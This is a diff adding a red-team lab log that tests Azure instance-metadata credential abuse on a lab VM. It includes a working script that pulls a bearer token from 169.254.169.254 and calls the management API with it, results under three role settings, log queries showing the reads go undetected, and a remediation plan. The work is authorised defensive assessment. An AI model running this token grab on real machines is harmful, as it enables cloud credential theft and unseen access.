@@ -1,0 +1,77 @@
+### 2026-11-14 (UTC-6); times in ### lines are UTC-6; timestamps inside captured output are UTC, as the systems print them (UTC-6 = UTC minus 6 h)
+### test: scenario #6, cloud credential abuse via the instance metadata service (T1552.005), first run. Runbook: attack/scenarios/scenario-6-imds-credential-abuse.md. Pre-registration: attack/scenarios/PREREGISTRATION.md #6.
+### note: pre-registered outcome. Baseline (identity has no role): Prevented: token theft cannot be prevented (IMDS is local and always issues a token), but RBAC prevents any further information gathering through ARM (GET refused, 403). Detected: No (neither the token request nor the read writes to AzureActivity). Misconfigured (identity granted Reader): Prevented: token theft equally unpreventable; RBAC now allows reads within rg-cne-lab (GET 200). Detected: No (equally undetectable).
+### note: identity under test: vm-cne-hub (the NVA, 10.100.2.4) system-assigned identity; service-principal object id 656e43d8-1d01-49ac-9bc1-e0012c20f052. Baseline: identity present, no role assignment. Assume-breach: the attacker already has command execution on vm-cne-hub (exercised here through az vm run-command).
+### note: this run was executed against the standing lab. The remediation (remove the VM identity so no service principal backs the token endpoint) is a separate change (infra/envs/lab/compute.tf) and its verification is recorded separately once applied.
+### note: PII scrubbed: the operator's object id (role-assignment updatedBy, and AzureActivity Caller) is shown as <redacted>/<owner-id>; the VM service-principal object id is a lab resource and is kept; subscription id kept in plain text as elsewhere; the bearer token is never printed, only its length (token_len) and the HTTP status of the ARM call.
+
+### note: screenshots of the three run-command GET results (403 / 200 / 403) are saved alongside: EV-M3-07-scenario-6-baseline.png, EV-M3-07-scenario-6-misconfigured.png, EV-M3-07-scenario-6-restore.png. In the images, SUB is masked, the Azure offer label and the role-assignment updatedBy object id are blacked out; the subscription id shown in the ARM URLs/role-assignment id is kept in plain text as elsewhere.
+
+### (a) baseline: identity present, no role. Token obtainable, ARM call refused.
+### cmd (17:18:16): on vm-cne-hub, acquire an ARM token from IMDS and call ARM (GET resources); the token value is discarded, only its length and the HTTP status are kept
+az vm run-command invoke -g rg-cne-lab -n vm-cne-hub --command-id RunShellScript --scripts '
+date -u
+SUB="23f19e67-5d24-4e37-9258-707daef49af0"
+TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"access_token\"])")
+echo "token_len ${#TOKEN}"
+curl -s -o /dev/null -w "HTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-cne-lab/resources?api-version=2021-04-01"'
+
+[stdout]
+Sat Nov 14 23:18:16 UTC 2026
+token_len 2144
+HTTP 403
+
+### note: the token endpoint issued a 2144-char bearer token (the SP exists), but ARM returned 403 to the resources list. Token issuance (needs an SP) is decoupled from authorisation (needs an RBAC role); the SP has no role, so the stolen credential authorises nothing. IMDS is local (169.254.169.254); no network control applies. RBAC is the effective control.
+
+### (b) misconfigured: grant the SP Reader on the resource group, re-run.
+### cmd (17:20:50): az role assignment create --assignee-object-id 656e43d8-1d01-49ac-9bc1-e0012c20f052 --assignee-principal-type ServicePrincipal --role "Reader" --scope "/subscriptions/23f19e67-5d24-4e37-9258-707daef49af0/resourceGroups/rg-cne-lab"
+createdOn:        2026-11-14T23:20:50.560941+00:00
+principalId:      656e43d8-1d01-49ac-9bc1-e0012c20f052
+principalType:    ServicePrincipal
+roleDefinitionId: .../roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7
+scope:            /subscriptions/23f19e67-5d24-4e37-9258-707daef49af0/resourceGroups/rg-cne-lab
+updatedBy:        <redacted>
+
+### note: acdd72a7-... is the built-in Reader role; scope is rg-cne-lab only.
+### cmd (17:26:04): same token-and-ARM-call as (a), after the Reader grant
+
+[stdout]
+Sat Nov 14 23:26:04 UTC 2026
+token_len 2144
+HTTP 200
+
+### note: identical call, same token length, now HTTP 200. One RBAC change (Reader on the RG) flips the stolen credential from inert to a working read of every resource in the group. The VM, the token, and the code path are unchanged; only the role assignment differs. This is the configured-vs-effective point: the control that matters here is RBAC, not anything on the VM.
+
+### (c) restore: remove the Reader grant, re-run.
+### cmd (17:28:31): az role assignment delete --assignee 656e43d8-1d01-49ac-9bc1-e0012c20f052 --role "Reader" --scope "/subscriptions/23f19e67-5d24-4e37-9258-707daef49af0/resourceGroups/rg-cne-lab"
+### cmd (17:28:52): same token-and-ARM-call
+
+[stdout]
+Sat Nov 14 23:28:52 UTC 2026
+token_len 2144
+HTTP 403
+
+### note: back to 403. The effect tracks the role assignment exactly and is reversible.
+
+### (d) signal: whether the defender can see the attacker's actions.
+### cmd: AzureActivity | where TimeGenerated > ago(1h) | where Caller == "656e43d8-1d01-49ac-9bc1-e0012c20f052" | project TimeGenerated, OperationNameValue, ActivityStatusValue, Caller
+
+(no rows)
+
+### cmd: AzureActivity | where TimeGenerated > ago(1h) | where OperationNameValue contains "ROLE" | project TimeGenerated, OperationNameValue, ActivityStatusValue, Caller
+ActivityStatusValue    Caller      OperationNameValue                              TableName      TimeGenerated
+---------------------  ----------  ----------------------------------------------  -------------  ----------------------------
+Start                  <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/DELETE  PrimaryResult  2026-11-14T23:16:15.3390111Z
+Success                <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/DELETE  PrimaryResult  2026-11-14T23:16:17.417145Z
+Start                  <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/DELETE  PrimaryResult  2026-11-14T23:28:31.7521372Z
+Success                <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/DELETE  PrimaryResult  2026-11-14T23:28:33.0334264Z
+Start                  <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE   PrimaryResult  2026-11-14T23:05:03.5762564Z
+Success                <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE   PrimaryResult  2026-11-14T23:05:05.3887698Z
+Start                  <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE   PrimaryResult  2026-11-14T23:20:50.4176594Z
+Success                <owner-id>  MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE   PrimaryResult  2026-11-14T23:20:52.0895399Z
+
+### note: the SP's own activity -- the IMDS token request and the ARM resources-list GETs in (a), (b), (c) -- produces NO AzureActivity row (first query empty). AzureActivity records control-plane WRITES; a read and a token acquisition are not writes. The only visible events are the operator's own role assign/remove (second query, Caller = <owner-id>), which are the misconfiguration and its cleanup, not the attack. So the credential theft and the read are invisible; only granting the role leaves a trace, and only if someone watches role-assignment writes. These operator writes serve as a control group: a write by the same window IS logged, which is why the read's absence is meaningful rather than a collection gap. Detected: No for the attacker's actions.
+### note: the WRITE at 23:05 and DELETE at 23:16 are from an earlier dry run during setup; the Reader grant/remove used for this evidence are the 23:20:50 WRITE and the 23:28:31 DELETE.
+
+### remediation (pending, separate change): remove the system-assigned identity from vm-cne-hub (infra/envs/lab/compute.tf identity block), so Azure deletes the backing service principal and the IMDS token endpoint can no longer mint an ARM credential from the VM. Verification to append once applied: (1) az vm show -g rg-cne-lab -n vm-cne-hub --query identity == null; (2) on the VM, the token endpoint returns HTTP 400 (no SP to issue a token) while http://169.254.169.254/metadata/instance still returns 200 (IMDS itself remains; only token issuance is gone); (3) AMA log shipping continues -- an nft drop (e.g. tier2 to tier0:22) still reaches Syslog after the identity is removed, confirming the identity was never needed for telemetry.
